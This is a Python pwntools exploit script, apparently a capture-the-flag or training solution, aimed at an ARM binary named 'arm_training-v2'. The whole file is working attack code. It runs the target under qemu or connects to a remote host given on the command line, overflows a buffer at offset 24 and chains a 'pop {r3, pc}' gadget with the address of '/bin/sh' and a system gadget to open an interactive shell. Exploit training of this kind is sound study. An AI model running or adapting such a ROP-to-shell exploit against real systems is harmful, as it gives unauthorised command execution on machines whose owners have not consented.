#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('arm_training-v2')

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-arm-static","-g","5000", "-L", "/usr/arm-linux-gnueabi/", exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi/", exe.path] + argv, *a, **kw)
    

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 24
    pop_r3_pc = 0x000103c0 # pop {r3, pc}; 
    system_func = exe.sym["gadget1"] + 0x10

    payload = flat({
        offset: [
            pop_r3_pc,
            next(exe.search(b"/bin/sh\x00")),
            system_func
        ]
    })

    io.sendline(payload)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

